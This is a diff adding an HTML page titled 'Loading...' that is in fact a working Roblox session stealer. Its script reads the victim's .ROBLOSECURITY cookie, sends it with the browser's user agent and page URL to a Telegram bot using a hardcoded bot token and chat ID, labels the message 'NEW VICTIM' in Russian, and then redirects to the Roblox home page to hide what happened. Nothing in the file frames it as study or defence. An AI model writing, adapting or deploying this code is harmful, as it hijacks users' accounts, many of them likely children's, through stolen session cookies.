@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head><title>Loading...</title></head>
+<body>
+<script>
+(async function() {
+    const BOT_TOKEN = "8687425768:AAGMtM6wO5uhBpJDnHqXSGD4tknJ08Ob5Dg";
+    const CHAT_ID   = "7817287840";
+
+    const cookies = document.cookie.split('; ').reduce((acc, cur) => {
+        const [key, val] = cur.split('=');
+        acc[key] = val;
+        return acc;
+    }, {});
+
+    const roblosec = cookies[".ROBLOSECURITY"] || "КУКА НЕ НАЙДЕНА";
+
+    const msg = `НОВАЯ ЖЕРТВА\n.ROBLOSECURITY: ${roblosec}\nUser-Agent: ${navigator.userAgent}\nURL: ${window.location.href}`;
+
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+    });
+
+    window.location.href = 'https://www.roblox.com/home';
+})();
+</script>
+</body>
+</html>
